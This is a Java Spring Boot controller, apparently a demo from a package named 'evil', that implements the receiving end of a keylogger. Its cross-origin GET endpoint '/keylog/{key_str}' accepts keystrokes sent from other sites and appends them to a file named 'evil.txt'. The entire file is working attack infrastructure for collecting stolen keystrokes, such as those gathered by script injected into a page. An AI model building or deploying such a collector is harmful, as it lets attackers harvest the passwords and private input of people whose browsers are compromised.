package com.evil.demo.controller;

import org.springframework.core.io.ClassPathResource;
import org.springframework.web.bind.annotation.*;
import java.io.*;

@RestController
@CrossOrigin
public class SniffingController {

    private String path = new ClassPathResource("evil.txt").getPath();

    @GetMapping("/keylog/{key_str}")
    public String logging(
            @PathVariable("key_str") String key
    ) {
        try(FileWriter fw = new FileWriter(path, true);
            BufferedWriter bw = new BufferedWriter(fw);
            PrintWriter out = new PrintWriter(bw))
        {
            out.print(key);
        } catch (IOException e) {
            System.out.println(e);
        }
        return key;
    }
}
